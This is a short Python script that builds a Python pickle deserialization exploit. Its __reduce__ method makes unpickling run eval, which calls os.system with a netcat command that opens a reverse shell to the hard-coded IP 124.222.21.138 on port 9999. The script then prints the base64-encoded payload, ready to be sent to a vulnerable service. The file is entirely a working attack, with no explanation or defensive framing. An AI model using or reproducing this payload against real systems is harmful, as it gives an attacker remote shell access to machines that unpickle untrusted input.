import base64
import pickle
import re

class A(object):
    def __reduce__(self):
        return (eval, ("__import__('os').system('nc 124.222.21.138 9999 -e/bin/sh')",))


a = A()
print(base64.b64encode(pickle.dumps(a)))
